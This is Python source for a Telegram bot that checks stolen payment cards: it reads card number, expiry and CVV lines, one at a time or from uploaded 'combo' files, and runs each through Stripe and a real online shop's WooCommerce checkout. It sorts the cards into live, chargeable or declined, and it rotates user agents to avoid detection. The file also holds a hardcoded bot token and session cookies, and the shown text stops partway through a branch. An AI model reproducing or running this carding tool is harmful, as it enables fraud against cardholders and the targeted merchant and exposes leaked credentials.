#pylint:disable=W0602
#pylint:disable=W0621
# pylint:disable=W0703
# pylint:disable=W0603
#——————————————————————#
import os
try:
	import telebot, requests, json, time, re
except ImportError:
	os.system("pip install telebot requests")
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
#——————————————————————#
iD = ["5894339732", "-1001971321750"]
#الايديهات الي عايزه يشتغل عليها (برايفت وجروبات)
bot_token = "5929009539:AAG18NDhJ8JzMnh-Kx64Ne0qAq3EG2OI91w"
#توكن بوتك ^^

bot = telebot.TeleBot(bot_token)
print("BoT started")
#——————————————————————#
@bot.message_handler(commands=['full_access'])
def add_access(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
	    user_id = message.text.split()[1].strip()
	
	    if is_user_allowed(user_id):
	        bot.reply_to(message, "User already has full access.")
	    else:
	        iD.append(user_id)
	        bot.reply_to(message, "User added to the full access list.")
    else:
    	bot.reply_to(message, "Only Admins !")

@bot.message_handler(commands=['remove_access'])
def remove_access(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    user_id = message.text.split()[1].strip()
	
	    if user_id in iD:
	        iD.remove(user_id)
	        bot.reply_to(message, "User removed from the full access list.")
	    else:
	        bot.reply_to(message, "User is not in the full access list.")
    else:
    	bot.reply_to(message, "Only Admins !")
        
@bot.message_handler(commands=['vip_ids'])
def get_full_access_users(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    users_list = []
	    groups_list = []
	
	    for chat_id in iD:
	        try:
	            chat_info = bot.get_chat(chat_id)
	            chat_name = chat_info.title if chat_info.type != 'private' else chat_info.first_name
	            if chat_id.startswith('-'):
	                groups_list.append(f"{chat_id} - {chat_name}")
	            else:
	                users_list.append(f"{chat_id} - {chat_name}")
	        except telebot.apihelper.ApiException:
	            pass
	
	    response = "Users with full access:\n" + "\n".join(users_list)
	    response += "\n\nGroups with full access:\n" + "\n".join(groups_list)
	
	    if len(response) > 0:
	        bot.reply_to(message, response)
	    else:
	        bot.reply_to(message, "No users or groups have full access.")
    else:
    	bot.reply_to(message, "Only Admins !")
#——————————————————————#
def is_user_allowed(user_id):
    allowed_user_ids = [str(id) for id in iD]
    return str(user_id) in allowed_user_ids
#——————————————————————#
is_card_checking = False
session = requests.Session()
#——————————————————————#
cookies_string = """
connect.sid=s:MCE-PwmRppBTD0rP6PEWGvmawaAu96Zw.vYrF//t/Msr47H8crZG/7vaZE4BDJabAMMiRPaychMI; _ga=GA1.2.274625785.1689700484; __stripe_mid=2b310490-6577-4945-8920-a9342c2f3e2a418228; ajs_user_id=24832198; ajs_anonymous_id=3226cfec-4143-4218-9857-b6d43948e75f; replit_authed=1; __cf_bm=1zqFD.6eW_T6w0vN8qpDBH.KUTMyjM99wjEibK27fHU-1689863118-0-ATOqAcXyU0YAy30L7P7zosS82dz/OBcNGuP+eLO6A+t55fgx+ukK/KN8TzIrCeVjPjv4+4K+nh73iTZAU2wFtS0=; _cfuvid=PzQ8wNYWRd4Z.PMmoO8dVwqT2r1IG_Yw50dyoh31fZM-1689863118557-0-604800000; amplitudeSessionId=1689863124; _gid=GA1.2.534174233.1689863162; __stripe_sid=17103662-f0d8-44b8-b831-da5e481a8404f5d29d; sidebarClosed=true; _gat=1; _dd_s=logs=1&id=5a5d5436-fd00-471f-a2dc-e0f442df6e3d&created=1689863126471&expire=1689864135203&rum=0
"""

datA = {}

pairs = cookies_string.split("; ")

for pair in pairs:
    if "=" in pair:
        key, value = pair.split("=", 1)
        datA[key.strip()] = value.strip()

cookies_dict = json.loads(json.dumps(datA))  

cookies = requests.cookies.cookiejar_from_dict(cookies_dict)
#——————————————————————#
@bot.message_handler(commands=['update_cookies'])
def handle_update_cookies_command(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
	    global cookies 
	    command = message.text.split(" ", 1)
	    if len(command) > 1:
	        new_cookies = command[1].strip()
	        
	        datA = {}
	        pairs = new_cookies.split("; ")
	
	        for pair in pairs:
	            if "=" in pair:
	                key, value = pair.split("=", 1)
	                datA[key.strip()] = value.strip()
	
	        cookies_dict = json.loads(json.dumps(datA))  
	        cookies = requests.cookies.cookiejar_from_dict(cookies_dict)
	        
	        cookies_string = "; ".join([f"{key}={value}" for key, value in cookies_dict.items()])
	        
	        bot.reply_to(message, f"Cookies updated successfully.\n\n{cookies_string}")
	    else:
	        bot.reply_to(message, "Please provide the new cookies.")
    else:
    	bot.reply_to(message, "Only Admins !")

@bot.message_handler(commands=['get_cookies'])
def handle_get_cookies_command(message):
    
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    global cookies  
	    
	    cookies_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
	
	    bot.reply_to(message, f"Current Cookies:\n\n{cookies_string}")
    else:
    	bot.reply_to(message, "Only Admins !")
#——————————————————————#
@bot.message_handler(commands=['help'])
def handle_help_command(message):
	
	bot.reply_to(message, "You Can Ask For Help From The Admins ⟹ @M_408")
	
@bot.message_handler(commands=['start'])
def handle_start_command(message):
	chat_id = message.chat.id
	first_name = message.from_user.first_name
	reply_message = f"Hello {first_name} in Chaecker BoT\n\nSend: /chk  ⟺  /file\n\n" \
                    f"Bot by: <a href='tg://user?id=5894339732'>Mostafa</a>"

	photo_path = "3.jpg"
	photo = open(photo_path, 'rb')
	
	bot.send_photo(chat_id, photo, caption=reply_message, parse_mode='html')
	
@bot.message_handler(commands=['chk'])
def handle_check_command(message):
	try:
		chat_id = message.chat.id
		initial_message = bot.reply_to(message, "I got the card, give me 1sec to check it")
		card_details = message.text.split(' ')[1]
		card_data = card_details.split('|')
		cc, mes, ano, cvv = map(str.strip, card_data)
		card = f"{cc}|{mes}|{ano}|{cvv}"
		
		ua = UserAgent()
		random_user_agent = ua.random
#——–———–—————————–—————–#
		if cc.startswith("4"):
			card_brand = "visa"
		elif cc.startswith("5"):
			card_brand = "mastercard"
		headers = {
    "authority": "api.stripe.com",
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": random_user_agent,
}
		
		data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F310016d8ed%3B+stripe-js-v3%2F310016d8ed%3B+card-element&time_on_page=12345&key=pk_live_51MYsPKBP8IJaYbH6fcr5ISD3Iy3LrRWiJkw6hUqU0Zg9fxcwXmpm6IUVgdIPFtlUeLQBF5jOjDgtXaqHIIBFm2oj00120pbKRj"
		
		response = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
		
		response_data = response.json()
		data = json.loads(response.text)
		while "id" not in data:
			bot.edit_message_text("This CC failed the Luhn algorithm, please enter a valid card!", chat_id, initial_message.message_id) 
			is_not_in_luhn = True
			break
		
		pm = data["id"]
		is_not_in_luhn = False
#——–———–—————————–—————–#
		res = session.get("https://candlemakingworld.com/step/checkout-2/")
		response_text = res.text
		
		soup = BeautifulSoup(response_text, 'html.parser')
		
		input_tag = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
		
		if input_tag:
		  nonce = input_tag['value']
#——–———–—————————–—————–#
		headers = {
    "authority": "candlemakingworld.com",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://candlemakingworld.com",
    "referer": "https://candlemakingworld.com/step/checkout-2/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": random_user_agent,
    "x-requested-with": "XMLHttpRequest",
}
		params = {
    "wc-ajax": "checkout",
    "wcf_checkout_id": "680",
    }
		data = {
    "billing_email": "vababi2453@rc3s.com",
    "billing_first_name": "No",
    "billing_last_name": "Thing",
    "_wcf_flow_id": "678",
    "_wcf_checkout_id": "680",
    "wcf_bump_product_id": "737",
    "payment_method": "cpsw_stripe",
    "woocommerce-process-checkout-nonce": nonce,
    "_wp_http_referer": "/step/checkout-2/?wc-ajax=update_order_review&wcf_checkout_id=680",
    "_wcf_bump_products": "",
    "payment_method_created": pm,
    "card_brand": card_brand,
}
		response = session.post("https://candlemakingworld.com/", params=params, headers=headers, data=data)
		parsed_data = json.loads(response.text)
		redirect_value = parsed_data["redirect"]
		pi_match = re.search(r'pi_([A-Za-z0-9_]+)', redirect_value)
		pi_value = pi_match.group(1)
		client_secret = f"pi_{pi_value}"
		pi = client_secret.split("_secret_")[0]
#——–———–—————————–—————–#
		
		url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
		headers = {
    "authority": "api.stripe.com",
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": random_user_agent,
}
		data = {
    "expected_payment_method_type": "card",
    "use_stripe_sdk": "true",
    "key": "pk_live_51MYsPKBP8IJaYbH6fcr5ISD3Iy3LrRWiJkw6hUqU0Zg9fxcwXmpm6IUVgdIPFtlUeLQBF5jOjDgtXaqHIIBFm2oj00120pbKRj",
    "client_secret": client_secret,
}
		
		response = session.post(url, data=data,headers=headers)
		result = response.text
		response_data = result
		print(response_data)
		if "Your card was declined." in response.text or "incorrect_number" in response.text or "Your card's expiration month is invalid." in response.text or "Error updating default payment method. Your card was declined." in response.text or "Card is declined by your bank, please contact them for additional information." in response.text:
			data = json.loads(response_data)
			
			decline_code = data["error"]["decline_code"]
			if decline_code:
				decline_code = data["error"]["decline_code"]
			
			else:
				decline_code = "None"
			try:
			        response_data = json.loads(response_data)
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        elif isinstance(response_data, dict):
			        	if 'error' in response_data and 'message' in response_data['error']:
			        		error_message = response_data['error']['message']
			        		msg_text = error_message
			        	else:
			        		raise KeyError
			        else:
			        	raise TypeError
			except (KeyError, IndexError):
			    msg_text = "Your card was declined."
			except (TypeError, json.JSONDecodeError):
			    msg_text = "Invalid response data"
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "Your card was declined."
	
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : Declined ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text} »» {decline_code}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "incorrect_zip" in response.text:
			msg_text = "incorrect_zip"
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : Declined ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "Security code is incorrect" in response.text or "incorrect_cvc" in response.text or "security code is incorrect." in response.text or "security code is invalid." in response.text or "Your card's security code is incorrect" in response.text:
			
			try:
			        response_data = json.loads(response_data)
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        elif isinstance(response_data, dict):
			        	if 'error' in response_data and 'message' in response_data['error']:
			        		error_message = response_data['error']['message']
			        		msg_text = error_message
			        	else:
			        		raise KeyError
			        else:
			        	raise TypeError
			except (KeyError, IndexError):
			    msg_text = "Your card's security code is incorrect"
			except (TypeError, json.JSONDecodeError):
			    msg_text = "Invalid response data"
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "Your card's security code is incorrect"
	
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ⟹ CNN ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "Your card has insufficient funds." in response.text:
			msg_text = "Your card has insufficient funds."
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	"""
	
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "succeeded" in response.text or "Membership Confirmation" in response.text or "Thank you for your support!" in response.text or "Thank you for your donation" in response.text or "/wishlist-member/?reg=" in response.text or "Thank You" in response.text:
			msg_text = "succeeded"
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : CHARGED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "transaction_not_allowed" in response.text or "Your card is not supported." in response.text or '"cvc_check": "pass"' in response.text or "Your card does not support this type of purchase." in response.text:
			print(response_data)
			try:
			        response_data = json.loads(response_data)
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        elif isinstance(response_data, dict):
			        	if 'error' in response_data and 'message' in response_data['error']:
			        		error_message = response_data['error']['message']
			        	else:
			        		raise KeyError
			        else:
			        	raise TypeError
			except (KeyError, IndexError):
			    msg_text = "transaction_not_allowed"
			except (TypeError, json.JSONDecodeError):
			    error_message = "Invalid response data"
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "transaction_not_allowed"
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {error_message}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif """"next_action": {
	    "type": "use_stripe_sdk",""" in response.text or "stripe_3ds2_fingerprint" in response.text:
			msg_text = "OTP"
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : OTP ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "lock_timeout" in response.text:
			bot.send_message(chat_id=message.chat.id,text="Try Again")
	#——————————————————————#
		else:
			msg_text = "UnKnown"
			bot.send_message(chat_id=message.chat.id,text=f"Hi, I Got Card With Unknown response:\n{card}")
			print(response.text)
			print("="*60)
	except IndexError:
	   bot.edit_message_text("The Card Is Not in This Format\nXXXXXXXXXXXXXXXX|XX|XXXX|XXX", chat_id, initial_message.message_id)
	except Exception as e:
	   print(e)
	   if is_not_in_luhn != True:
	   	bot.edit_message_text("an error happend", chat_id, initial_message.message_id)
	   else:
	   	pass
#——————————————————————#
@bot.message_handler(commands=['file'])
def handle_fill_command(message):
	if not is_user_allowed(message.chat.id):
		bot.reply_to(message, "Fuck you, Go Ask for Access From Admin @M_408 ")
		return
	photo_path = "2.jpg"
	photo = open(photo_path, 'rb')
	text = "Please send the combo file."
	bot.send_photo(chat_id=message.chat.id, caption=text, photo=photo)

	global is_card_checking
	is_card_checking = True


	@bot.message_handler(content_types=['document'])
	def handle_card_file(message):
	    try:
	        file_id = message.document.file_id
	        file_info = bot.get_file(file_id)
	        file_path = file_info.file_path
	
	        cards = []
	
	        downloaded_file = bot.download_file(file_path)
	
	        file_content = downloaded_file.decode('utf-8')
	        card_lines = file_content.strip().split('\n')
	
	        for line in card_lines:
	            card_data = line.strip().split('|')
	
	            if len(card_data) != 4:
	                
	                continue
	
	            cc, mes, ano, cvv = map(str.strip, card_data)
	            cards.append((cc, mes, ano, cvv))
	
	        check_cards_from_file(message, cards)
	
	    except Exception as e:
	        bot.reply_to(message, "An error occurred while checking the cards.")
	        print(str(e))
	        
	        
	def check_cards_from_file(message, cards):
	    try:
	        not_working_cards = []
	        working_cards = []
	        cards_3D_secure = []
	        insufficient_founds = []
	        ccn_cards = []
	        live_cards = []
	
	        text = "I'm checking, please wait..."
	        msg = bot.send_message(chat_id=message.chat.id,text=text)
	
	        for cc, mes, ano, cvv in cards:
	            if not is_card_checking:
	                break
	                
	            if (int(ano)) < 100:
	                if (int(ano)) < 23:
	                    pass
	            elif (int(ano)) < 2023:
	               pass

	
	            msg_text = "None"
	            card = f"{cc}|{mes}|{ano}|{cvv}"
	            

	            ua = UserAgent()
	            random_user_agent = ua.random
	            
	            if cc.startswith("4"):
	            	card_brand = "visa"
	            elif cc.startswith("5"):
	            	card_brand = "mastercard"
	            headers = {
    "authority": "api.stripe.com",
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": random_user_agent,
}
	            
	            data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F310016d8ed%3B+stripe-js-v3%2F310016d8ed%3B+card-element&time_on_page=12345&key=pk_live_51MYsPKBP8IJaYbH6fcr5ISD3Iy3LrRWiJkw6hUqU0Zg9fxcwXmpm6IUVgdIPFtlUeLQBF5jOjDgtXaqHIIBFm2oj00120pbKRj"
	            
	            response = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
	            
	            response_data = response.json()
	            data = json.loads(response.text)
	            try:
	            	pm = data["id"]
	            except Exception:
	            	pass
#——–———–—————————–—————–#
	            res = session.get("https://candlemakingworld.com/step/checkout-2/")
	            response_text = res.text
	            
	            soup = BeautifulSoup(response_text, 'html.parser')
	            
	            input_tag = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
	            
	            if input_tag:
	              nonce = input_tag['value']
#——–———–—————————–—————–#
	            headers = {
    "authority": "candlemakingworld.com",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://candlemakingworld.com",
    "referer": "https://candlemakingworld.com/step/checkout-2/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": random_user_agent,
    "x-requested-with": "XMLHttpRequest",
}
	            params = {
    "wc-ajax": "checkout",
    "wcf_checkout_id": "680",
    }
	            data = {
    "billing_email": "vababi2453@rc3s.com",
    "billing_first_name": "No",
    "billing_last_name": "Thing",
    "_wcf_flow_id": "678",
    "_wcf_checkout_id": "680",
    "wcf_bump_product_id": "737",
    "payment_method": "cpsw_stripe",
    "woocommerce-process-checkout-nonce": nonce,
    "_wp_http_referer": "/step/checkout-2/?wc-ajax=update_order_review&wcf_checkout_id=680",
    "_wcf_bump_products": "",
    "payment_method_created": pm,
    "card_brand": card_brand,
}
	            response = session.post("https://candlemakingworld.com/", params=params, headers=headers, data=data)
	            parsed_data = json.loads(response.text)
	            redirect_value = parsed_data["redirect"]
	            pi_match = re.search(r'pi_([A-Za-z0-9_]+)', redirect_value)
	            pi_value = pi_match.group(1)
	            client_secret = f"pi_{pi_value}"
	            pi = client_secret.split("_secret_")[0]
#——–———–—————————–—————–#
	            
	            url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
	            headers = {
    "authority": "api.stripe.com",
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "'Android'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": random_user_agent,
}
	            data = {
    "expected_payment_method_type": "card",
    "use_stripe_sdk": "true",
    "key": "pk_live_51MYsPKBP8IJaYbH6fcr5ISD3Iy3LrRWiJkw6hUqU0Zg9fxcwXmpm6IUVgdIPFtlUeLQBF5jOjDgtXaqHIIBFm2oj00120pbKRj",
    "client_secret": client_secret,
}
    
	            response = session.post(url, data=data)
	            
	            result = response.text
	            response_data = result
	            
#——–————–——————–———————#
	            if "Your card was declined." in response.text or "incorrect_number" in response.text or "Your card's expiration month is invalid." in response.text or "Error updating default payment method. Your card was declined." in response.text or "Card is declined by your bank, please contact them for additional information." in response.text or "Invalid account." in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card was declined."
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            					msg_text = str(error_message)
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card was declined."
	            				not_working_cards.append(card)
#——————————————————————#
	            elif "incorrect_zip" in response.text:
	            	msg_text = "incorrect_zip"
	            	not_working_cards.append(card)
#——————————————————————#
	            elif "Your card's security code is incorrect" in response.text or "security code is invalid." in response.text or "security code is incorrect." in response.text or "Security code is incorrect" in response.text or "incorrect_cvc" in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card's security code is incorrect"
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card's security code is incorrect"
		    
	            				ccn_cards.append(card)
	            				messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ⟹ CNN  ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══

"""
	            				bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#—————————INSUFF—————————#
	            elif "Your card has insufficient funds." in response.text:
	                msg_text = "Your card has insufficient funds."
	                insufficient_founds.append(card)
	                messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══

"""
	                bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#————————CHARGED–——–—–———#
	            elif "succeeded" in response.text or "Membership Confirmation" in response.text or "Thank you for your support!" in response.text or "Thank you for your donation" in response.text or "/wishlist-member/?reg=" in response.text or "Thank You" in response.text:
	                
	                working_cards.append(card)
	                messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : CHARGED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══

"""
	                bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#———————LIVE CARDS————————#
	            elif "transaction_not_allowed" in response.text or "Your card is not supported." in response.text or '"cvc_check": "pass"' in response.text or "Your card does not support this type of purchase." in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card does not support this type of purchase."
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            					msg_text = str(error_message)
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card does not support this type of purchase."
	            				live_cards.append(card)
	            				messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {str(msg_text)}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a> 』══

"""
	            				bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#——————————————————————#
	            elif """"next_action": {
    "type": "use_stripe_sdk",""" in response.text or "stripe_3ds2_fingerprint" in response.text:
	                msg_text = "OTP"
